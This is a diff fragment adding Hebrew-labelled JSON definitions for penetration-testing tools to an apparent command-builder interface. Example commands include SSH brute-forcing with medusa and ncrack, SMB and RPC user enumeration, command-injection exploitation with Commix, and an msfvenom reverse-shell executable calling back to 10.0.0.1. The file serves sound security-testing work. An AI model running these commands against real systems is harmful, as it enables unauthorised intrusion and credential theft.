+      "id": "commix", "name": "Commix", "binary": "commix", "package": "commix", "category": "web",
+      "desc": "זיהוי וניצול אוטומטי של הזרקות פקודה (Command Injection).",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "URL", "type": "text", "required": true, "placeholder": "https://example.com/?id=1" },
+        { "id": "batch", "flag": "--batch", "label": "מצב אוטומטי (--batch)", "type": "bool", "default": true },
+        { "id": "data", "flag": "--data", "label": "נתוני POST", "type": "text", "placeholder": "id=1" },
+        { "id": "level", "flag": "--level", "label": "רמה (1-3)", "type": "number", "placeholder": "1" }
+      ],
+      "examples": [ "commix -u 'https://example.com/?id=1' --batch" ]
+    },
+    {
+      "id": "xsstrike", "name": "XSStrike", "binary": "xsstrike", "package": "xsstrike", "category": "web",
+      "desc": "כלי מתקדם לגילוי וניצול חולשות XSS.",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "URL", "type": "text", "required": true, "placeholder": "https://example.com/?q=1" },
+        { "id": "crawl", "flag": "--crawl", "label": "סרוק אתר (--crawl)", "type": "bool" },
+        { "id": "blind", "flag": "--blind", "label": "Blind XSS", "type": "bool" }
+      ],
+      "examples": [ "xsstrike -u 'https://example.com/?q=1'" ]
+    },
+    {
+      "id": "arjun", "name": "Arjun", "binary": "arjun", "package": "arjun", "category": "web",
+      "desc": "מגלה פרמטרים נסתרים ב-HTTP endpoints.",
+      "options": [
+        { "id": "url", "flag": "-u", "label": "URL", "type": "text", "required": true, "placeholder": "https://example.com/api" },
+        { "id": "method", "flag": "-m", "label": "מתודה", "type": "select",
+          "choices": [ {"v":"","t":"GET (ברירת מחדל)"}, {"v":"GET","t":"GET"}, {"v":"POST","t":"POST"}, {"v":"JSON","t":"JSON"} ] }
+      ],
+      "examples": [ "arjun -u https://example.com/api" ]
+    },
+    {
+      "id": "joomscan", "name": "JoomScan", "binary": "joomscan", "package": "joomscan", "category": "web",
+      "desc": "סורק אבטחה ל-Joomla — גרסאות, רכיבים וחולשות ידועות.",
+      "options": [
+        { "id": "url", "flag": "--url", "label": "URL", "type": "text", "required": true, "placeholder": "https://example.com" },
+        { "id": "components", "flag": "--enumerate-components", "label": "מנה רכיבים", "type": "bool" }
+      ],
+      "examples": [ "joomscan --url https://example.com" ]
+    },
+    {
+      "id": "gospider", "name": "GoSpider", "binary": "gospider", "package": "gospider", "category": "web",
+      "desc": "זחלן ווב מהיר (Go) — מיפוי קישורים, טפסים ונכסים.",
+      "options": [
+        { "id": "site", "flag": "-s", "label": "אתר", "type": "text", "required": true, "placeholder": "https://example.com" },
+        { "id": "depth", "flag": "-d", "label": "עומק", "type": "number", "placeholder": "1" },
+        { "id": "concurrent", "flag": "-c", "label": "מקביליות", "type": "number", "placeholder": "5" },
+        { "id": "other", "flag": "-a", "label": "מקורות נוספים (-a)", "type": "bool" }
+      ],
+      "examples": [ "gospider -s https://example.com -d 2" ]
+    },
+    {
+      "id": "crackmapexec", "name": "CrackMapExec", "binary": "crackmapexec", "package": "crackmapexec", "category": "smb",
+      "desc": "\"סכין שוויצרית\" לרשתות Windows/AD — אנומרציה ואימות SMB/WinRM/LDAP.",
+      "options": [
+        { "id": "proto", "flag": "", "label": "פרוטוקול", "type": "select", "required": true,
+          "choices": [ {"v":"smb","t":"smb"}, {"v":"winrm","t":"winrm"}, {"v":"ldap","t":"ldap"}, {"v":"ssh","t":"ssh"}, {"v":"mssql","t":"mssql"}, {"v":"ftp","t":"ftp"} ] },
+        { "id": "user", "flag": "-u", "label": "משתמש", "type": "text", "placeholder": "administrator" },
+        { "id": "pass", "flag": "-p", "label": "סיסמה", "type": "text", "placeholder": "Password123" },
+        { "id": "shares", "flag": "--shares", "label": "רשימת שיתופים (--shares)", "type": "bool" },
+        { "id": "users", "flag": "--users", "label": "מנה משתמשים (--users)", "type": "bool" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.0/24" }
+      ],
+      "examples": [ "crackmapexec smb 192.168.1.0/24", "crackmapexec smb 10.0.0.5 -u admin -p pass --shares" ]
+    },
+    {
+      "id": "rpcclient", "name": "rpcclient", "binary": "rpcclient", "package": "smbclient", "category": "smb",
+      "desc": "לקוח MS-RPC — אנומרציה של משתמשים, קבוצות ומידע דומיין (null session).",
+      "options": [
+        { "id": "user", "flag": "-U", "label": "משתמש", "type": "text", "placeholder": "'' (ריק=אנונימי)" },
+        { "id": "nopass", "flag": "-N", "label": "ללא סיסמה (-N)", "type": "bool", "default": true },
+        { "id": "cmd", "flag": "-c", "label": "פקודה", "type": "select", "required": true,
+          "choices": [ {"v":"enumdomusers","t":"enumdomusers"}, {"v":"enumdomgroups","t":"enumdomgroups"}, {"v":"querydominfo","t":"querydominfo"}, {"v":"srvinfo","t":"srvinfo"}, {"v":"netshareenum","t":"netshareenum"}, {"v":"getdompwinfo","t":"getdompwinfo"} ] },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.10" }
+      ],
+      "examples": [ "rpcclient -U '' -N -c enumdomusers 192.168.1.10" ]
+    },
+    {
+      "id": "enum4linux-ng", "name": "enum4linux-ng", "binary": "enum4linux-ng", "package": "enum4linux-ng", "category": "smb",
+      "desc": "גרסה משודרגת של enum4linux — אנומרציית SMB/RPC מקיפה בפייתון.",
+      "options": [
+        { "id": "all", "flag": "-A", "label": "כל הבדיקות (-A)", "type": "bool", "default": true },
+        { "id": "users", "flag": "-U", "label": "משתמשים (-U)", "type": "bool" },
+        { "id": "shares", "flag": "-S", "label": "שיתופים (-S)", "type": "bool" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.10" }
+      ],
+      "examples": [ "enum4linux-ng -A 192.168.1.10" ]
+    },
+    {
+      "id": "snmpwalk", "name": "snmpwalk", "binary": "snmpwalk", "package": "snmp", "category": "smb",
+      "desc": "שאילתות SNMP — משיכת עץ ה-MIB ממכשירים עם קהילה חשופה.",
+      "options": [
+        { "id": "version", "flag": "-v", "label": "גרסה", "type": "select", "required": true,
+          "choices": [ {"v":"2c","t":"2c"}, {"v":"1","t":"1"}, {"v":"3","t":"3"} ] },
+        { "id": "community", "flag": "-c", "label": "Community", "type": "text", "required": true, "default": "public", "placeholder": "public" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.10" }
+      ],
+      "examples": [ "snmpwalk -v2c -c public 192.168.1.10" ]
+    },
+    {
+      "id": "snmp-check", "name": "snmp-check", "binary": "snmp-check", "package": "snmpcheck", "category": "smb",
+      "desc": "אנומרציית SNMP קריאה לאדם — מערכת, משתמשים, תהליכים, חיבורים.",
+      "options": [
+        { "id": "community", "flag": "-c", "label": "Community", "type": "text", "default": "public", "placeholder": "public" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.10" }
+      ],
+      "examples": [ "snmp-check -c public 192.168.1.10" ]
+    },
+    {
+      "id": "medusa", "name": "Medusa", "binary": "medusa", "package": "medusa", "category": "passwords",
+      "desc": "כלי brute-force מודולרי ומקבילי להתחברות לשירותים.",
+      "options": [
+        { "id": "host", "flag": "-h", "label": "מארח", "type": "text", "required": true, "placeholder": "192.168.1.10" },
+        { "id": "user", "flag": "-u", "label": "משתמש בודד", "type": "text", "placeholder": "admin" },
+        { "id": "userlist", "flag": "-U", "label": "רשימת משתמשים", "type": "text" },
+        { "id": "pass", "flag": "-p", "label": "סיסמה בודדת", "type": "text" },
+        { "id": "passlist", "flag": "-P", "label": "רשימת סיסמאות", "type": "text", "placeholder": "/usr/share/wordlists/rockyou.txt" },
+        { "id": "module", "flag": "-M", "label": "מודול/שירות", "type": "select", "required": true,
+          "choices": [ {"v":"ssh","t":"ssh"}, {"v":"ftp","t":"ftp"}, {"v":"http","t":"http"}, {"v":"smbnt","t":"smbnt"}, {"v":"rdp","t":"rdp"}, {"v":"mysql","t":"mysql"}, {"v":"telnet","t":"telnet"} ] }
+      ],
+      "examples": [ "medusa -h 192.168.1.10 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh" ]
+    },
+    {
+      "id": "ncrack", "name": "Ncrack", "binary": "ncrack", "package": "ncrack", "category": "passwords",
+      "desc": "כלי פיצוח אימות רשת מהיר (מבית Nmap).",
+      "options": [
+        { "id": "user", "flag": "-u", "label": "משתמש", "type": "text", "placeholder": "root" },
+        { "id": "userlist", "flag": "-U", "label": "רשימת משתמשים", "type": "text" },
+        { "id": "passlist", "flag": "-P", "label": "רשימת סיסמאות", "type": "text", "placeholder": "/usr/share/wordlists/rockyou.txt" },
+        { "id": "target", "flag": "", "label": "מטרה (host:port או service://host)", "type": "text", "primary": true, "required": true, "placeholder": "ssh://192.168.1.10:22" }
+      ],
+      "examples": [ "ncrack -u root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10" ]
+    },
+    {
+      "id": "crunch", "name": "Crunch", "binary": "crunch", "package": "crunch", "category": "passwords",
+      "desc": "מחולל רשימות סיסמאות (wordlists) לפי אורך ותווים.",
+      "options": [
+        { "id": "min", "flag": "", "label": "אורך מינימלי", "type": "number", "required": true, "placeholder": "6" },
+        { "id": "max", "flag": "", "label": "אורך מקסימלי", "type": "number", "required": true, "placeholder": "8" },
+        { "id": "charset", "flag": "", "label": "תווים", "type": "text", "placeholder": "abcdef0123456789" },
+        { "id": "out", "flag": "-o", "label": "קובץ פלט", "type": "text", "default": "/tmp/crunch_wordlist.txt", "help": "מומלץ לשמור לקובץ — הפלט עלול להיות ענק" }
+      ],
+      "examples": [ "crunch 6 8 abcdef0123456789 -o /tmp/wordlist.txt" ]
+    },
+    {
+      "id": "cewl", "name": "CeWL", "binary": "cewl", "package": "cewl", "category": "passwords",
+      "desc": "מחולל wordlist מותאם ע\"י גירוד מילים מאתר יעד.",
+      "options": [
+        { "id": "depth", "flag": "-d", "label": "עומק זחילה", "type": "number", "placeholder": "2" },
+        { "id": "minlen", "flag": "-m", "label": "אורך מילה מינימלי", "type": "number", "placeholder": "5" },
+        { "id": "write", "flag": "-w", "label": "קובץ פלט", "type": "text", "placeholder": "/tmp/cewl.txt" },
+        { "id": "url", "flag": "", "label": "URL", "type": "text", "primary": true, "required": true, "placeholder": "https://example.com" }
+      ],
+      "examples": [ "cewl -d 2 -m 5 -w /tmp/cewl.txt https://example.com" ]
+    },
+    {
+      "id": "hashid", "name": "hashid", "binary": "hashid", "package": "hashid", "category": "passwords",
+      "desc": "מזהה את סוג ה-hash ומציע מצבי hashcat/john מתאימים.",
+      "options": [
+        { "id": "mode", "flag": "-m", "label": "הצג מצב hashcat (-m)", "type": "bool", "default": true },
+        { "id": "john", "flag": "-j", "label": "הצג פורמט John (-j)", "type": "bool" },
+        { "id": "hash", "flag": "", "label": "Hash", "type": "text", "primary": true, "required": true, "placeholder": "5f4dcc3b5aa765d61d8327deb882cf99" }
+      ],
+      "examples": [ "hashid -m '5f4dcc3b5aa765d61d8327deb882cf99'" ]
+    },
+    {
+      "id": "searchsploit", "name": "SearchSploit", "binary": "searchsploit", "package": "exploitdb", "category": "exploit",
+      "desc": "חיפוש מקומי במאגר Exploit-DB אחר אקספלויטים לפי מוצר/גרסה.",
+      "options": [
+        { "id": "www", "flag": "-w", "label": "הצג קישורי אתר (-w)", "type": "bool" },
+        { "id": "cve", "flag": "--cve", "label": "חיפוש לפי CVE", "type": "text", "placeholder": "2021-44228" },
+        { "id": "term", "flag": "", "label": "מונח חיפוש", "type": "text", "primary": true, "required": true, "placeholder": "apache 2.4" }
+      ],
+      "examples": [ "searchsploit apache 2.4", "searchsploit --cve 2021-44228" ]
+    },
+    {
+      "id": "msfvenom", "name": "msfvenom", "binary": "msfvenom", "package": "metasploit-framework", "category": "exploit",
+      "desc": "מחולל payloads של Metasploit בפורמטים שונים.",
+      "options": [
+        { "id": "payload", "flag": "-p", "label": "Payload", "type": "select", "required": true,
+          "choices": [ {"v":"windows/meterpreter/reverse_tcp","t":"windows/meterpreter/reverse_tcp"}, {"v":"windows/x64/meterpreter/reverse_tcp","t":"windows/x64/meterpreter/reverse_tcp"}, {"v":"linux/x86/meterpreter/reverse_tcp","t":"linux/x86/meterpreter/reverse_tcp"}, {"v":"linux/x64/shell_reverse_tcp","t":"linux/x64/shell_reverse_tcp"}, {"v":"php/meterpreter/reverse_tcp","t":"php/meterpreter/reverse_tcp"}, {"v":"cmd/unix/reverse_bash","t":"cmd/unix/reverse_bash"} ] },
+        { "id": "lhost", "flag": "LHOST", "label": "LHOST", "type": "text", "eq": true, "required": true, "placeholder": "10.0.0.1" },
+        { "id": "lport", "flag": "LPORT", "label": "LPORT", "type": "text", "eq": true, "placeholder": "4444" },
+        { "id": "format", "flag": "-f", "label": "פורמט פלט", "type": "select", "required": true,
+          "choices": [ {"v":"exe","t":"exe"}, {"v":"elf","t":"elf"}, {"v":"raw","t":"raw"}, {"v":"python","t":"python"}, {"v":"php","t":"php"}, {"v":"war","t":"war"}, {"v":"psh","t":"psh (PowerShell)"} ] },
+        { "id": "out", "flag": "-o", "label": "קובץ פלט", "type": "text", "placeholder": "/tmp/payload.exe" }
+      ],
+      "examples": [ "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o /tmp/shell.exe" ]
+    },
+    {
+      "id": "binwalk", "name": "Binwalk", "binary": "binwalk", "package": "binwalk", "category": "forensics",
+      "desc": "ניתוח וחילוץ קבצים מוטמעים ותמונות קושחה (firmware).",
+      "options": [
+        { "id": "extract", "flag": "-e", "label": "חלץ קבצים (-e)", "type": "bool" },
+        { "id": "matryoshka", "flag": "-M", "label": "חילוץ רקורסיבי (-M)", "type": "bool" },
+        { "id": "file", "flag": "", "label": "קובץ", "type": "text", "primary": true, "required": true, "placeholder": "/path/firmware.bin" }
+      ],
+      "examples": [ "binwalk -e firmware.bin" ]
+    },
+    {
+      "id": "foremost", "name": "Foremost", "binary": "foremost", "package": "foremost", "category": "forensics",
+      "desc": "שחזור קבצים (file carving) לפי חתימות מתוך דיסק/תמונה.",
+      "options": [
+        { "id": "input", "flag": "-i", "label": "קובץ קלט", "type": "text", "required": true, "placeholder": "/path/image.dd" },
+        { "id": "output", "flag": "-o", "label": "תיקיית פלט", "type": "text", "required": true, "default": "/tmp/foremost_out" },
+        { "id": "types", "flag": "-t", "label": "סוגי קבצים", "type": "text", "placeholder": "jpg,pdf,doc" }
+      ],
+      "examples": [ "foremost -i image.dd -o /tmp/foremost_out" ]
+    },
+    {
+      "id": "exiftool", "name": "ExifTool", "binary": "exiftool", "package": "libimage-exiftool-perl", "category": "forensics",
+      "desc": "קריאת מטא-דאטה מקבצי תמונה, מסמכים ומדיה.",
+      "options": [
+        { "id": "all", "flag": "-a", "label": "כלול כפולים (-a)", "type": "bool" },
+        { "id": "groups", "flag": "-G", "label": "הצג קבוצות (-G)", "type": "bool" },
+        { "id": "file", "flag": "", "label": "קובץ", "type": "text", "primary": true, "required": true, "placeholder": "/path/photo.jpg" }
+      ],
+      "examples": [ "exiftool photo.jpg" ]
+    },
+    {
+      "id": "steghide", "name": "Steghide", "binary": "steghide", "package": "steghide", "category": "forensics",
+      "desc": "חילוץ מידע מוסתר (steganography) מקבצי תמונה/שמע.",
+      "options": [
+        { "id": "cmd", "flag": "", "label": "פעולה", "type": "select", "required": true,
+          "choices": [ {"v":"extract","t":"extract (חילוץ)"}, {"v":"info","t":"info (מידע)"} ] },
+        { "id": "sf", "flag": "-sf", "label": "קובץ מקור", "type": "text", "required": true, "placeholder": "/path/image.jpg" },
+        { "id": "pass", "flag": "-p", "label": "סיסמה", "type": "text", "placeholder": "(ריק אם אין)" }
+      ],
+      "examples": [ "steghide extract -sf image.jpg -p secret" ]
+    },
+    {
+      "id": "strings", "name": "strings", "binary": "strings", "package": "binutils", "category": "forensics",
+      "desc": "חילוץ מחרוזות טקסט קריא מקבצים בינאריים.",
+      "options": [
+        { "id": "minlen", "flag": "-n", "label": "אורך מינימלי", "type": "number", "placeholder": "4" },
+        { "id": "file", "flag": "", "label": "קובץ", "type": "text", "primary": true, "required": true, "placeholder": "/path/binary" }
+      ],
+      "examples": [ "strings -n 6 /bin/ls" ]
+    },
+    {
+      "id": "aircrack-ng", "name": "Aircrack-ng", "binary": "aircrack-ng", "package": "aircrack-ng", "category": "wireless",
+      "desc": "פיצוח מפתחות WEP/WPA מקובצי לכידה (.cap/.pcap). עובד offline.",
+      "options": [
+        { "id": "wordlist", "flag": "-w", "label": "Wordlist", "type": "text", "placeholder": "/usr/share/wordlists/rockyou.txt" },
+        { "id": "bssid", "flag": "-b", "label": "BSSID", "type": "text", "placeholder": "00:11:22:33:44:55" },
+        { "id": "file", "flag": "", "label": "קובץ לכידה", "type": "text", "primary": true, "required": true, "placeholder": "/path/capture.cap" }
+      ],
+      "examples": [ "aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap" ]
+    },
+    {
+      "id": "hping3", "name": "hping3", "binary": "hping3", "package": "hping3", "category": "netscan",
+      "desc": "יוצר חבילות TCP/IP מותאמות — בדיקת firewall, סריקה ו-traceroute. דורש root.",
+      "options": [
+        { "id": "mode", "flag": "", "label": "סוג חבילה", "type": "select",
+          "choices": [ {"v":"","t":"ברירת מחדל"}, {"v":"-S","t":"-S SYN"}, {"v":"-A","t":"-A ACK"}, {"v":"-F","t":"-F FIN"}, {"v":"-1","t":"-1 ICMP"}, {"v":"-2","t":"-2 UDP"} ] },
+        { "id": "port", "flag": "-p", "label": "פורט", "type": "number", "placeholder": "80" },
+        { "id": "count", "flag": "-c", "label": "מספר חבילות", "type": "number", "default": "3", "placeholder": "3" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.10" }
+      ],
+      "examples": [ "hping3 -S -p 80 -c 3 192.168.1.10" ]
+    },
+    {
+      "id": "fping", "name": "fping", "binary": "fping", "package": "fping", "category": "netscan",
+      "desc": "Ping מקבילי למארחים רבים — גילוי מהיר של מכשירים חיים.",
+      "options": [
+        { "id": "alive", "flag": "-a", "label": "הצג חיים בלבד (-a)", "type": "bool", "default": true },
+        { "id": "gen", "flag": "-g", "label": "טווח/רשת (-g)", "type": "bool", "default": true },
+        { "id": "quiet", "flag": "-q", "label": "שקט (-q)", "type": "bool", "default": true },
+        { "id": "target", "flag": "", "label": "טווח", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.0/24" }
+      ],
+      "examples": [ "fping -a -g 192.168.1.0/24" ]
+    },
+    {
+      "id": "nping", "name": "Nping", "binary": "nping", "package": "nmap", "category": "netscan",
+      "desc": "מחולל חבילות רשת (מבית Nmap) לבדיקת קישוריות ותגובות.",
+      "options": [
+        { "id": "mode", "flag": "", "label": "פרוטוקול", "type": "select",
+          "choices": [ {"v":"--tcp","t":"--tcp"}, {"v":"--udp","t":"--udp"}, {"v":"--icmp","t":"--icmp"}, {"v":"--arp","t":"--arp"} ] },
+        { "id": "port", "flag": "-p", "label": "פורט", "type": "number", "placeholder": "80" },
+        { "id": "count", "flag": "-c", "label": "מספר חבילות", "type": "number", "default": "3", "placeholder": "3" },
+        { "id": "target", "flag": "", "label": "מטרה", "type": "text", "primary": true, "required": true, "placeholder": "192.168.1.10" }
+      ],
+      "examples": [ "nping --tcp -p 80 -c 3 192.168.1.10" ]
+    },
+    {
+      "id": "tcpdump", "name": "tcpdump", "binary": "tcpdump", "package": "tcpdump", "category": "netscan",
+      "desc": "לוכד ומנתח תעבורת רשת. דורש root. מוגבל למספר חבילות כדי לא להיתקע.",
+      "options": [
+        { "id": "iface", "flag": "-i", "label": "ממשק", "type": "text", "default": "eth0", "placeholder": "eth0" },
+        { "id": "count", "flag": "-c", "label": "מספר חבילות", "type": "number", "default": "50", "placeholder": "50", "help": "חובה — אחרת ילכוד ללא הפסקה" },
+        { "id": "nn", "flag": "-nn", "label": "ללא רזולוציית שמות (-nn)", "type": "bool", "default": true },
+        { "id": "filter", "flag": "", "label": "מסנן BPF", "type": "text", "primary": true, "placeholder": "port 80 and host 10.0.0.5" }
+      ],
+      "examples": [ "tcpdump -i eth0 -c 50 -nn port 80" ]
+    },
+    {
+      "id": "tshark", "name": "TShark", "binary": "tshark", "package": "tshark", "category": "netscan",
+      "desc": "גרסת שורת הפקודה של Wireshark ללכידת וניתוח חבילות. דורש root.",
+      "options": [
+        { "id": "iface", "flag": "-i", "label": "ממשק", "type": "text", "default": "eth0", "placeholder": "eth0" },
+        { "id": "count", "flag": "-c", "label": "מספר חבילות", "type": "number", "default": "50", "placeholder": "50", "help": "חובה — אחרת ילכוד ללא הפסקה" },
+        { "id": "cfilter", "flag": "-f", "label": "מסנן לכידה (BPF)", "type": "text", "placeholder": "tcp port 443" },
+        { "id": "dfilter", "flag": "-Y", "label": "מסנן תצוגה", "type": "text", "placeholder": "http.request" }
+      ],
+      "examples": [ "tshark -i eth0 -c 50 -f 'tcp port 80'" ]
+    },
+    {
+      "id": "macchanger", "name": "MAC Changer", "binary": "macchanger", "package": "macchanger", "category": "util",
+      "desc": "צפייה ושינוי כתובת ה-MAC של ממשק רשת.",
+      "options": [
+        { "id": "show", "flag": "-s", "label": "הצג נוכחי (-s)", "type": "bool" },
+        { "id": "random", "flag": "-r", "label": "MAC אקראי (-r)", "type": "bool" },
+        { "id": "mac", "flag": "-m", "label": "MAC ספציפי", "type": "text", "placeholder": "00:11:22:33:44:55" },
+        { "id": "iface", "flag": "", "label": "ממשק", "type": "text", "primary": true, "required": true, "placeholder": "eth0" }
+      ],
+      "examples": [ "macchanger -r eth0" ]
+    }
+  ]
+}
